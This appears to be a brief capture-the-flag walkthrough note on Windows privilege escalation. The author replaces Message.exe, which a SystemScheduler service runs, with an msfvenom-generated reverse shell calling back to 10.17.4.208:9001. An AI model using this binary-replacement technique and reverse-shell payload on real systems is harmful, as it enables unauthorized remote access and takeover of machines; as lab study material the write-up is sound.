from the services running (ps) we see that there is a WScheduler.exe service running. 
And from the program files its SystemScheduler

![[Pasted image 20210527204315.png]]

and then from the logs its due to Message.exe

![[Pasted image 20210527204347.png]]

 and its in the `C:\program files (x86)\SystemScheduler`
![[Pasted image 20210527204517.png]]

so we will override it 

generate the payload and listen and after few seconds we got the shell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o message.exe`

![[Pasted image 20210527204924.png]]